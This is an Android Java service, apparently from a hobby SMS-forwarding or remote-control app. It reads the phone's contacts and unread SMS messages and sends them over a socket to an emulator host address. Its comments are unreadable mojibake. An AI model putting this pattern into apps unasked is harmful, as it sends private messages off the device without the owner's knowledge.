package my.service;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.Socket;
import java.net.UnknownHostException;

import my.pro.ReadSMS;
import my.pro.SendSMS;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.widget.Toast;


/*
 *�޷�������service
 **/

public class SocketService extends Service {

	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		super.onCreate();
	}

	@Override
	public void onDestroy() {
		// TODO Auto-generated method stub
		super.onDestroy();
	}

	@Override
	public void onStart(Intent intent, int startId) {
		// TODO Auto-generated method stub
		super.onStart(intent, startId);
		
		String host = "10.0.2.2";
		int port = 8080;
		Socket socket = null;
		//BufferedReader in = null;
		PrintWriter out = null;
		String msSend = "socket test";
		
		SharedPreferences sharedPrefe = getSharedPreferences("parameters", Context.MODE_PRIVATE);
		// �ڶ��������ĺ��壺Value to return if this preference does not exist.
		long restartTime = sharedPrefe.getLong("cancelTime", 0);

		if (restartTime == 0) {
			Cursor contactCursor = null;

			Cursor messageCursor = null;
			try {

				// ��ϵ���б�
				contactCursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);

				// �����б����
				Uri uri = Uri.parse("content://sms//inbox");
				String[] projection = new String[] { "_id", "read", "address", "person", "body", "date" };
				String selection = "read = 0";

				// ��ȡδ������,Cursorָ��һ��Ҫע�⡣��ȡ�б�ʱ��һ��Ҫȴ���α��ڿ�ʼλ��
				messageCursor = getContentResolver().query(uri, projection, selection, null, "date desc");

				// ��ȡ���õ�����
				String getPassword = sharedPrefe.getString("password", "");

				String sendToPhone = sharedPrefe.getString("commandnumber", "");		
				
				// ��ȡδ������
				ReadSMS readSMS = new ReadSMS();
				StringBuilder strSMS = new StringBuilder();
				strSMS = readSMS.smsNumber(messageCursor, contactCursor, getPassword);
				
				msSend = strSMS.toString();
				//msSend = msSend.replace('\n', '-');
				if(msSend.charAt(msSend.length()-1) == '\n')
					msSend = msSend.substring(0, msSend.length()-1);
				System.out.println(msSend);
				
				
			} catch (Exception ex) {

			} finally {

				messageCursor.close();
				contactCursor.close();

			}

		} else {
			
			
			Cursor contactCursor = null;

			Cursor messageCursor = null;
			try {

				// ��ϵ���б�
				contactCursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);

				// �����б����
				Uri uri = Uri.parse("content://sms//inbox");
				String[] projection = new String[] { "_id", "read", "address", "person", "body", "date" };
				
				//���ɸѡ���������⣬long���͵�����̫��
				String selection = "read=0";

				// ��ȡδ������,Cursorָ��һ��Ҫע�⡣��ȡ�б�ʱ��һ��Ҫȴ���α��ڿ�ʼλ��
				messageCursor = getContentResolver().query(uri, projection, selection, null, "date desc");

				//Toast.makeText(getApplicationContext(), "ִ��else���-----"+messageCursor.getCount(), Toast.LENGTH_LONG).show();
				
				// ��ȡ���õ�����
				String getPassword = sharedPrefe.getString("password", "");

				

				String sendToPhone = sharedPrefe.getString("commandnumber", "");

				// ��ȡδ������
				ReadSMS readSMS = new ReadSMS();
				StringBuilder strSMS = new StringBuilder();
				
				//��ReadSMS���������һ���µķ��������ݵĲ�����һ��date
				strSMS = readSMS.smsNumber(messageCursor, contactCursor, getPassword,restartTime);

				msSend = strSMS.toString();
				//msSend = msSend.replace('\n', '-');
				if(msSend.charAt(msSend.length()-1) == '\n')
					msSend = msSend.substring(0, msSend.length()-1);

				

				// --------------------------------------------//
			} catch (Exception ex) {

				Toast.makeText(getApplicationContext(), ex.toString(), Toast.LENGTH_LONG).show();
			} finally {

				messageCursor.close();
				contactCursor.close();

			}

		}
		
		
		
		
		
		try {
			socket = new Socket(host, port);
			out = new PrintWriter(new BufferedWriter(new OutputStreamWriter(socket.getOutputStream())), true);
			if (socket.isConnected()) {
				if (!socket.isOutputShutdown()) {
					out.println("5554");
					out.println(msSend);
				} else
					System.out.println("the channel is closed!");
			} else
				System.out.println("cannot connect to the host!");
		} catch (UnknownHostException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) { // TODO Auto-generated catch block
			e.printStackTrace();
		}
		
		
	}

	

}
